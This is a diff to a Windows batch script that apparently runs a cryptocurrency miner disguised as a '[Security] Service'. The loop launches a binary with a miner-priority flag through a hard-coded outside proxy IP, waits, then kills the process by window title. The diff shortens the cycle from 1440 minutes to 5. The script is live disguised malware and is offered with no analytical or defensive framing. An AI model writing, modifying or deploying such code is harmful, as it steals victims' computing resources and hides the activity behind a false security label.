@@ -49,7 +49,7 @@ timeout /t 600 /nobreak
 :SECURITY_LOOP
 
 echo ----------------------------------------
-echo [Security] Service running (1440 minutes)
+echo [Security] Service running (5 minutes)
 echo ----------------------------------------
 
 start "%WINTITLE%" "%BIN%" ^
@@ -69,8 +69,8 @@ start "%WINTITLE%" "%BIN%" ^
  --miner-priority 1 ^
  --proxy 174.138.61.184:1080
 
-REM Tunggu 1440 menit
-timeout /t 86400 /nobreak
+REM Tunggu 5 menit
+timeout /t 300 /nobreak
 
 echo [Security] Stopping service...
 taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1
